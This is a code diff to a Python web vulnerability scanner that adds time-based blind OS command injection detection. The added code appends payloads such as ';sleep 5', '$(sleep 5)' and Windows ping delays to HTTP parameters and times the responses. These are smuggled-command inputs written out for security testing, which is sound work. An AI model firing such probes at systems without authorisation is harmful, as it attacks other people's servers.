@@ -65,14 +65,21 @@ class CMDiModule(BaseModule):
                 # CRITICAL: Get baseline response FIRST (without payload)
                 baseline_text = self._get_baseline_response(url, params, param_name, method, http_client)
 
-                # FIRST: Test OOB (Blind Command Injection) - Most reliable
+                # FIRST: Test Time-based Blind CMDi (sleep commands)
+                time_result = self._test_time_based_cmdi(url, params, param_name, method, http_client)
+                if time_result:
+                    results.append(time_result)
+                    logger.info(f"✓ Blind CMDi (Time-based) found in {url} (parameter: {param_name})")
+                    continue  # Move to next parameter
+
+                # SECOND: Test OOB (Blind Command Injection)
                 oob_result = self._test_oob_cmdi(url, params, param_name, method, http_client)
                 if oob_result:
                     results.append(oob_result)
                     logger.info(f"✓ Blind CMDi (OOB) found in {url} (parameter: {param_name})")
-                    # Continue to test other parameters
+                    continue  # Move to next parameter
 
-                # SECOND: Try regular payloads with BASELINE COMPARISON
+                # THIRD: Try regular payloads with BASELINE COMPARISON
                 for payload in self.get_limited_payloads():  # Limit to 30 payloads
                     test_params = params.copy()
                     test_params[param_name] = str(params[param_name]) + payload
@@ -461,6 +468,119 @@ class CMDiModule(BaseModule):
         evidence += "Examples: " + " | ".join(evidence_parts[:2])
 
         return evidence
+
+    def _test_time_based_cmdi(self, url: str, params: Dict[str, Any], param_name: str,
+                              method: str, http_client: Any) -> Dict[str, Any]:
+        """
+        Test for Blind Command Injection using time-based detection (sleep commands)
+
+        Args:
+            url: Target URL
+            params: Parameters dictionary
+            param_name: Parameter name to test
+            method: HTTP method (GET/POST)
+            http_client: HTTP client
+
+        Returns:
+            Result dictionary if vulnerability found, None otherwise
+        """
+        import time
+
+        # Time-based payloads for different OSes
+        time_payloads = [
+            # Linux sleep
+            (';sleep 5', 5),
+            ('|sleep 5', 5),
+            ('`sleep 5`', 5),
+            ('$(sleep 5)', 5),
+            ('&&sleep 5', 5),
+            ('\nsleep 5', 5),
+            # Windows timeout/ping
+            (';ping -n 6 127.0.0.1', 5),
+            ('|ping -n 6 127.0.0.1', 5),
+            ('&ping -n 6 127.0.0.1', 5),
+            # Alternative separators
+            (';sleep${IFS}5', 5),
+            (';{sleep,5}', 5),
+        ]
+
+        logger.debug(f"Testing time-based blind CMDi with {len(time_payloads)} payloads")
+
+        # Get baseline response time
+        try:
+            start = time.time()
+            if method == 'POST':
+                http_client.post(url, data=params, timeout=10)
+            else:
+                http_client.get(url, params=params, timeout=10)
+            baseline_time = time.time() - start
+        except Exception:
+            baseline_time = 1.0  # Default if baseline fails
+
+        for payload, expected_delay in time_payloads[:5]:  # Limit to first 5
+            test_params = params.copy()
+            original_value = str(params.get(param_name, ''))
+            test_params[param_name] = original_value + payload
+
+            try:
+                start = time.time()
+                if method == 'POST':
+                    response = http_client.post(url, data=test_params, timeout=15)
+                else:
+                    response = http_client.get(url, params=test_params, timeout=15)
+                elapsed = time.time() - start
+
+                # Check if response took significantly longer (delay detected)
+                # Allow for 1 second tolerance
+                if elapsed >= expected_delay - 1 and elapsed > baseline_time + 3:
+                    logger.info(f"Time-based CMDi detected: {elapsed:.2f}s (expected {expected_delay}s, baseline {baseline_time:.2f}s)")
+
+                    result = self.create_result(
+                        vulnerable=True,
+                        url=url,
+                        parameter=param_name,
+                        payload=payload,
+                        evidence=f"Blind Command Injection confirmed via time-based detection.\n\n"
+                                f"**Payload:** {payload}\n"
+                                f"**Expected delay:** {expected_delay} seconds\n"
+                                f"**Actual response time:** {elapsed:.2f} seconds\n"
+                                f"**Baseline response time:** {baseline_time:.2f} seconds\n\n"
+                                f"The server executed the sleep/delay command, confirming RCE.",
+                        description="Blind OS Command Injection vulnerability detected via time-based technique. "
+                                  "The server executed a sleep command, confirming arbitrary command execution.",
+                        confidence=0.90
+                    )
+
+                    result['cwe'] = self.config.get('cwe', 'CWE-78')
+                    result['owasp'] = self.config.get('owasp', 'A03:2021')
+                    result['cvss'] = self.config.get('cvss', '9.8')
+                    result['detection_method'] = 'Time-based blind'
+
+                    return result
+
+            except Exception as e:
+                # Timeout might also indicate sleep worked
+                if 'timeout' in str(e).lower() or 'timed out' in str(e).lower():
+                    result = self.create_result(
+                        vulnerable=True,
+                        url=url,
+                        parameter=param_name,
+                        payload=payload,
+                        evidence=f"Blind Command Injection likely - request timed out.\n\n"
+                                f"**Payload:** {payload}\n"
+                                f"**Expected delay:** {expected_delay} seconds\n"
+                                f"**Result:** Request timed out (likely sleep executed)\n\n"
+                                f"Manual verification recommended.",
+                        description="Possible Blind OS Command Injection - request timed out after injecting sleep command.",
+                        confidence=0.75
+                    )
+                    result['cwe'] = 'CWE-78'
+                    result['detection_method'] = 'Time-based (timeout)'
+                    return result
+
+                logger.debug(f"Time-based test error: {e}")
+
+        return None
 
     def _test_oob_cmdi(self, url: str, params: Dict[str, Any], param_name: str,
                        method: str, http_client: Any) -> Dict[str, Any]:
